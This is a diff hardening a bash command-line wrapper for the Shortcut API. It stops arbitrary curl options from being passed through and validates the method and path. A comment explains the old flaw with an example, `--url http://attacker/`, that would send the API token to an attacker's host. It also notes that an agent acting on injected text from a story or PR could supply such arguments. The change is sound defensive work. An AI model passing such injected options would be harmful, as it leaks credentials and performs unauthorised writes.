@@ -44,8 +44,18 @@ token() {
   printf '%s' "$TOKEN"
 }
 
+# api <METHOD> <PATH> [JSON-BODY]
+#
+# Deliberately does NOT forward arbitrary arguments to curl. It used to take
+# "$@", which let a caller pass curl options -- and since the credential is
+# attached unconditionally, `--url http://attacker/` exfiltrated the token to
+# any host, `-X PUT` silently turned a read into a write, and `--output`
+# wrote arbitrary files. `sc raw` is documented to agents as a general escape
+# hatch, so those arguments can come from a model acting on untrusted text
+# (a story body, a PR description). Method and path are validated; the only
+# free-form input is a request body.
 api() {
-  local method="$1" path="$2" tok; shift 2
+  local method="$1" path="$2" reqbody="${3-}" tok; shift 2
   # Resolve the token in this shell, not inside the curl argument: a $(...)
   # substitution runs in a subshell, so a `die` there would not stop the
   # request and curl would be sent an empty token.
@@ -63,17 +73,30 @@ api() {
   # line: anything in argv is world-readable through `ps` for the lifetime
   # of the request, so -H "Shortcut-Token: $tok" would leak it to every
   # other process on the machine.
+  case "$method" in
+    GET|POST|PUT|DELETE) ;;
+    *) die "unsupported method: $method" ;;
+  esac
+  case "$path" in
+    /*) ;;
+    *) die "path must start with /: $path" ;;
+  esac
+  case $path in
+    *[$' \t\n\r']*) die "path contains whitespace: $path" ;;
+  esac
+
   local body status
+  local -a args=( -sS --config - -X "$method"
+                  -H "Content-Type: application/json"
+                  -w '\n%{http_code}' )
+  [ -n "$reqbody" ] && args+=( -d "$reqbody" )
   # -w appends the status so a non-2xx can be turned into a non-zero exit.
   # Without this curl returns 0 on 404/401/500 and the caller sees an error
   # JSON body as if it were data -- which an agent will happily treat as a
   # real answer.
+  # `--` stops option parsing so the URL can never be read as a flag.
   body=$(printf 'header = "Shortcut-Token: %s"\n' "$tok" \
-    | curl -sS --config - \
-        -X "$method" \
-        -H "Content-Type: application/json" \
-        -w '\n%{http_code}' \
-        "$@" "$API$path") || die "request failed: $method $path"
+    | curl "${args[@]}" -- "$API$path") || die "request failed: $method $path"
   status=${body##*$'\n'}
   body=${body%$'\n'*}
   case "$status" in
@@ -92,7 +115,7 @@ sc -- Shortcut CLI
   sc mine                      stories owned by you, not yet done
   sc comment <id> <text>       add a comment to a story
   sc start <id>                move story to its workflow "started" state
-  sc raw <METHOD> <PATH> [-d json]   any API v3 call
+  sc raw <METHOD> <PATH> [json-body]  any API v3 call
 
 Output is JSON; pipe to jq. Examples:
   sc story 12345 | jq '{name, url: .app_url}'
@@ -109,13 +132,13 @@ case "$cmd" in
   mine)    MENTION=$(api GET /member | jq -r '.mention_name')
            api GET "/search/stories?query=$(jq -rn --arg q "owner:$MENTION !is:done" '$q|@uri')" ;;
   comment) [ $# -ge 2 ] || die "usage: sc comment <id> <text>"
-           api POST "/stories/$1/comments" -d "$(jq -n --arg t "$2" '{text:$t}')" ;;
+           api POST "/stories/$1/comments" "$(jq -n --arg t "$2" '{text:$t}')" ;;
   start)   [ $# -ge 1 ] || die "usage: sc start <id>"
            WF=$(api GET /workflows | jq -r '.[0].states[] | select(.type=="started") | .id' | head -1)
            [ -n "$WF" ] || die "could not find a started workflow state"
-           api PUT "/stories/$1" -d "$(jq -n --argjson s "$WF" '{workflow_state_id:$s}')" ;;
-  raw)     [ $# -ge 2 ] || die "usage: sc raw <METHOD> <PATH> [-d json]"
-           M="$1"; P="$2"; shift 2; api "$M" "$P" "$@" ;;
+           api PUT "/stories/$1" "$(jq -n --argjson s "$WF" '{workflow_state_id:$s}')" ;;
+  raw)     [ $# -ge 2 ] || die "usage: sc raw <METHOD> <PATH> [json-body]"
+           api "$1" "$2" "${3-}" ;;
   help|--help|-h) usage ;;
   *)       die "unknown command: $cmd (try: sc help)" ;;
 esac
